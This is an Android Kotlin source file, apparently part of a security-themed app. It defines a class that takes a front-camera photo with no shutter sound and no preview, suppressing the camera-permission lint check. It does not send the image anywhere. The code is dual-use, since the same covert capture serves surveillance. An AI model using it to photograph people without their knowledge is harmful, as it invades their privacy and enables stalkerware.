package com.example.security

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

/**
 * Silent front-camera photo capture helper using Camera2 API.
 * Captures a single image frame without shutter sound or visible camera preview UI.
 */
class SilentCameraCapture(private val context: Context) {

    @SuppressLint("MissingPermission")
    suspend fun captureFrontPhotoSilently(): Bitmap? = suspendCancellableCoroutine { continuation ->
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        if (cameraManager == null) {
            Log.e(TAG, "CameraManager unavailable")
            continuation.resume(null)
            return@suspendCancellableCoroutine
        }

        val frontCameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val chars = cameraManager.getCameraCharacteristics(id)
            chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        } ?: cameraManager.cameraIdList.firstOrNull()

        if (frontCameraId == null) {
            Log.e(TAG, "No front camera found on device")
            continuation.resume(null)
            return@suspendCancellableCoroutine
        }

        val backgroundThread = HandlerThread("SilentCameraThread").apply { start() }
        val backgroundHandler = Handler(backgroundThread.looper)

        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
        var capturedBitmap: Bitmap? = null

        imageReader.setOnImageAvailableListener({ reader ->
            var image: Image? = null
            try {
                image = reader.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val rawBitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    if (rawBitmap != null) {
                        // Mirror & rotate front camera image properly
                        val matrix = Matrix().apply {
                            postRotate(270f)
                            postScale(-1f, 1f, rawBitmap.width / 2f, rawBitmap.height / 2f)
                        }
                        capturedBitmap = Bitmap.createBitmap(rawBitmap, 0, 0, rawBitmap.width, rawBitmap.height, matrix, true)
                        Log.i(TAG, "📸 [SILENT_CAMERA] Front photo captured successfully: ${capturedBitmap?.width}x${capturedBitmap?.height}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error decoding camera image: ${e.message}")
            } finally {
                image?.close()
            }
        }, backgroundHandler)

        try {
            cameraManager.openCamera(frontCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureBuilder.addTarget(imageReader.surface)
                        captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)

                        camera.createCaptureSession(
                            listOf(imageReader.surface),
                            object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                    try {
                                        session.capture(captureBuilder.build(), object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(
                                                session: android.hardware.camera2.CameraCaptureSession,
                                                request: CaptureRequest,
                                                result: android.hardware.camera2.TotalCaptureResult
                                            ) {
                                                super.onCaptureCompleted(session, request, result)
                                                // Give imageReader a moment to process frame before closing camera
                                                backgroundHandler.postDelayed({
                                                    try { camera.close() } catch (e: Exception) { /* ignored */ }
                                                    try { backgroundThread.quitSafely() } catch (e: Exception) { /* ignored */ }
                                                    if (continuation.isActive) {
                                                        continuation.resume(capturedBitmap)
                                                    }
                                                }, 150)
                                            }
                                        }, backgroundHandler)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Capture failed: ${e.message}")
                                        try { camera.close() } catch (ignored: Exception) {}
                                        try { backgroundThread.quitSafely() } catch (ignored: Exception) {}
                                        if (continuation.isActive) continuation.resume(null)
                                    }
                                }

                                override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                    Log.e(TAG, "Camera session configuration failed")
                                    try { camera.close() } catch (e: Exception) {}
                                    try { backgroundThread.quitSafely() } catch (e: Exception) {}
                                    if (continuation.isActive) continuation.resume(null)
                                }
                            },
                            backgroundHandler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Error building capture request: ${e.message}")
                        try { camera.close() } catch (ignored: Exception) {}
                        try { backgroundThread.quitSafely() } catch (ignored: Exception) {}
                        if (continuation.isActive) continuation.resume(null)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    try { backgroundThread.quitSafely() } catch (e: Exception) {}
                    if (continuation.isActive) continuation.resume(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera device error: $error")
                    camera.close()
                    try { backgroundThread.quitSafely() } catch (e: Exception) {}
                    if (continuation.isActive) continuation.resume(null)
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open camera: ${e.message}")
            try { backgroundThread.quitSafely() } catch (ignored: Exception) {}
            if (continuation.isActive) continuation.resume(null)
        }
    }

    companion object {
        private const val TAG = "SilentCameraCapture"
    }
}
